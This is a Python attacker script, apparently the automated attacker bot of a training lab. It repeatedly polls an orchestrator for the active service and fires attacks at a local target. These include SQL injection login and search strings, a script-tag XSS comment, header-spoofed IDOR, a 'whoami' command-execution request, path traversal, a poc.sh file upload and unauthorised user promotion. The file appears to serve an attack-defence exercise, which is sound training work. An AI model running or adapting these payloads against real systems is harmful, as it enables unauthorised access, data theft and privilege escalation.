import os
import time

import requests

ORCH = os.getenv("ORCH", os.getenv("ORCHESTRATOR_URL", "http://orchestrator:9000"))
MY_TARGET = os.getenv("MY_TARGET", "http://localhost:9100")


def get_active_service():
    try:
        r = requests.get(f"{ORCH}/current", timeout=3)
        if r.ok:
            data = r.json() or {}
            return data.get("active_service") or data.get("service") or "web"
    except Exception:
        pass
    return "web"


def post_json(path, payload, headers=None):
    r = requests.post(f"{MY_TARGET}{path}", json=payload, headers=headers or {}, timeout=5)
    return r.status_code, r.text[:160]


def get_path(path, headers=None):
    r = requests.get(f"{MY_TARGET}{path}", headers=headers or {}, timeout=5)
    return r.status_code, r.text[:160]


def attack_web():
    print("web/login", post_json("/web/login", {"username": "admin' OR '1'='1", "password": "x"}))
    print("web/search", get_path("/web/search?q=%27%20OR%20%271%27%3D%271"))
    print("web/comment", post_json("/web/comment", {"comment": "<script>alert(1)</script>"}))


def attack_api():
    print("api/admin", get_path("/api/admin"))
    print("api/idor", get_path("/api/users/2", headers={"X-User-Id": "1"}))
    print("api/run", post_json("/api/run", {"cmd": "whoami"}))


def attack_file():
    print("file/download", get_path("/file/download?file=../files/sample.txt"))
    try:
        with open(__file__, "rb") as bot_file:
            files = {"file": ("poc.sh", bot_file.read()[:32] or b"echo hack", "text/plain")}
        r = requests.post(f"{MY_TARGET}/file/upload", files=files, timeout=5)
        print("file/upload", r.status_code, r.text[:160])
    except Exception as exc:
        print("file/upload error:", exc)


def attack_db():
    print("db/query", post_json("/db/query", {"search": "' OR '1'='1"}))
    print("db/promote", post_json("/db/user/2/promote", {"requester_id": 1}))


def main():
    print("[attacker.py] started")
    while True:
        service = get_active_service()
        try:
            if service == "web":
                attack_web()
            elif service == "api":
                attack_api()
            elif service == "file":
                attack_file()
            elif service == "db":
                attack_db()
            else:
                print(f"unknown service: {service}")
        except Exception as exc:
            print(f"attack error: {exc}")
        time.sleep(3)


if __name__ == "__main__":
    main()
